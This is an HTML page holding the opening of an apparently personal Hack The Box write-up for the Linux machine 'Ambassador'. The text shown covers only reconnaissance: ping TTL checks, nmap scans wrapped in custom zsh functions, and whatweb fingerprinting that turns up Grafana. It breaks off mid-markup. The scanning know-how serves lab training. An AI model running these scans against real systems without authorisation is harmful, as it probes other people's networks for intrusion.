<!DOCTYPE html> <html lang="es"><head>
<title>Machine Ambassador</title>
<base href=".">
<script src="https://kmn9.github.io/theopendoor/site-lib/scripts/copy-commands.js"></script>
<meta name="pathname" content="machine-ambassador.html">
<meta name="description" content="Blog - Machine Ambassador">
<meta property="og:title" content="Machine Ambassador">
<meta property="og:description" content="Blog - Machine Ambassador">
<meta property="og:type" content="website">
<meta property="og:url" content="machine-ambassador.html">
<meta property="og:image" content="img/pasted-image-20251115173127.png">
<meta charset="UTF-8"><meta property="og:site_name" content="Blog"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="site-lib/rss.xml"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="stylesheet" href="site-lib/styles/theme.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><a href="https://kmn9.github.io/theopendoor/index.html" style="position:fixed;top:10px;left:10px;z-index:9999;background:rgba(30,30,30,0.8);backdrop-filter:blur(6px);color:#fff;padding:8px 14px;border-radius:50px;text-decoration:none;font-family:'Inter',sans-serif;font-size:14px;line-height:1;box-shadow:0 4px 12px rgba(0,0,0,0.25);transition:all 0.3s ease;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:6px;" onmouseover="this.style.background='rgba(60,60,60,0.85)';" onmouseout="this.style.background='rgba(30,30,30,0.8)';" onclick="this.blur();" >←<span style='display:none;@media(min-width:600px){display:inline;}'> Back to main page</span></a><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="Machine_Ambassador_0">Machine Ambassador</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-hr"><hr></div><div class="el-p"><p dir="auto">Tags: <a href="?query=tag:machine" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#machine">#machine</a> <a href="?query=tag:htb" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#htb">#htb</a> <a href="?query=tag:medium" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#medium">#medium</a> <a href="?query=tag:linux" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#linux">#linux</a> <a href="?query=tag:oscp" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#oscp">#oscp</a> <a href="?query=tag:grafana_exploitation" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#grafana_exploitation">#grafana_exploitation</a> <a href="?query=tag:grafana" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#grafana">#grafana</a> <a href="?query=tag:lfi" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#lfi">#lfi</a> <a href="?query=tag:arbitrary_file_read" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#arbitrary_file_read">#arbitrary_file_read</a> <a href="?query=tag:mysql_enumeration" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#mysql_enumeration">#mysql_enumeration</a> <a href="?query=tag:base64_password_decoding" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#base64_password_decoding">#base64_password_decoding</a> <a href="?query=tag:git_enumeration" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#git_enumeration">#git_enumeration</a> <a href="?query=tag:hashicorp_consul_exploitation" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#hashicorp_consul_exploitation">#hashicorp_consul_exploitation</a></p></div><div class="el-hr"><hr></div><div class="el-h1"><h1 data-heading="Information Gathering" dir="auto" class="heading" id="Information_Gathering_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Information Gathering</h1></div><div class="el-h2"><h2 data-heading="Discovering OS via TTL Using `ping`" dir="auto" class="heading" id="Discovering_OS_via_TTL_Using_`ping`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering OS via TTL Using <code>ping</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">10.10</span>.11.183
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115173127.png" src="img/pasted-image-20251115173127.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115173127.png" src="img/pasted-image-20251115173127.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Based on the <code>TTL</code> values obtained from the <code>ping</code> command, the operating system of the victim machine was identified as <code>Linux</code>. Typically, a TTL value below <code>64</code> corresponds to <code>Linux</code> systems, whereas a <code>TTL</code> between <code>65</code> and <code>128</code> indicates a <code>Windows</code> system. Next, a <code>UDP</code> port scan will be performed.</p></div><div class="el-h2"><h2 data-heading="UDP Port Scan Using `nmap`" dir="auto" class="heading" id="UDP_Port_Scan_Using_`nmap`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>UDP Port Scan Using <code>nmap</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">nmap <span class="token parameter variable">-sU</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> --top-ports <span class="token number">100</span> <span class="token number">10.10</span>.11.183 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'no-response'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115173144.png" src="img/pasted-image-20251115173144.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115173144.png" src="img/pasted-image-20251115173144.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>UDP</code> port scan did not report anything; another scan to discover open <code>TCP</code> ports will be performed.</p></div><div class="el-h2"><h2 data-heading="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)" dir="auto" class="heading" id="TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115173217.png" src="img/pasted-image-20251115173217.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115173217.png" src="img/pasted-image-20251115173217.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[+] Introduce una IP<span class="token entity" title="\n">\n</span>"</span>
        <span class="token builtin class-name">read</span> <span class="token function">ip</span>
        <span class="token builtin class-name">echo</span>
        <span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> -p- --min-rate <span class="token number">5000</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> <span class="token variable">$ip</span> <span class="token parameter variable">-oG</span> scan
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Using a custom function named <code>jmap</code>, previously defined in the <code>.zshrc</code>, a <code>TCP</code> scan was conducted, revealing that ports <code>22 (SSH)</code>, <code>80 (HTTP)</code>, <code>3000 (Unknown)</code>, and <code>3306 (MySQL)</code> were open, providing valuable context about the target machine. Following this discovery, a more detailed scan will be performed on the identified ports.</p></div><div class="el-h2"><h2 data-heading="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)" dir="auto" class="heading" id="Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">extractPorts scan
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115173234.png" src="img/pasted-image-20251115173234.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115173234.png" src="img/pasted-image-20251115173234.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">extractPorts</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Extracting information..."</span>
        
        <span class="token assign-left variable">ip_address</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'Host: \K\S+'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span> 

        <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d+(?=/open)'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">','</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/,$/\n/'</span><span class="token variable">)</span></span> 
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">{</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">}</span> <span class="token operator">&gt;&gt;</span> extractPorts.tmp
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token operator">|</span> xclip <span class="token parameter variable">-sel</span> clip
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Ports copied to clipboard<span class="token entity" title="\n">\n</span>"</span>
        <span class="token function">cat</span> extractPorts.tmp
        <span class="token function">rm</span> extractPorts.tmp
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function shown in the image <code>extractPorts</code>, also previously defined in the <code>.zshrc</code>, displays the information from the previous scan and copies the ports to the clipboard. This makes it easier to perform a second scan on the discovered ports, especially when there are many.</p></div><div class="el-h2"><h2 data-heading="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)" dir="auto" class="heading" id="Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap2
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115173837.png" src="img/pasted-image-20251115173837.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115173837.png" src="img/pasted-image-20251115173837.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">2</span> <span class="token punctuation">]</span>
        <span class="token keyword">then</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"Uso: jmap2 &lt;ip&gt; &lt;ports&gt;"</span>
                <span class="token builtin class-name">return</span> <span class="token number">1</span>
        <span class="token keyword">fi</span>
        
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span> 
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span> 
        nmap -p<span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token parameter variable">-sCV</span> <span class="token string">"<span class="token variable">$ip</span>"</span>

<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function <code>jmap2</code>, also predefined in the <code>.zshrc</code>, was used to perform a targeted scan on the previously identified ports. This scan aimed to enumerate the running services and their versions, as well as to apply basic reconnaissance scripts against those services. The results revealed interesting information, highlighting the discovery of the <code>Hugo v0.94.2</code> technology, whose function was previously unknown. Port <code>3000</code> was identified as an <code>HTTP</code> service running <code>Grafana</code>, which exposes a <code>/login</code> path. No additional valuable information was identified, so next an assessment of the technologies and services running on the web services will be performed.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80 &amp; 3000: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`" dir="auto" class="heading" id="TCP_Port_80_&amp;_3000_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80 &amp; 3000: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">whatweb http://10.10.11.183
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115173917.png" src="img/pasted-image-20251115173917.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115173917.png" src="img/pasted-image-20251115173917.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">whatweb http://10.10.11.183:3000
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116000011.png" src="img/pasted-image-20251116000011.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251116000011.png" src="img/pasted-image-20251116000011.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115173945.png" src="img/pasted-image-20251115173945.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115173945.png" src="img/pasted-image-20251115173945.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251116000120.png" 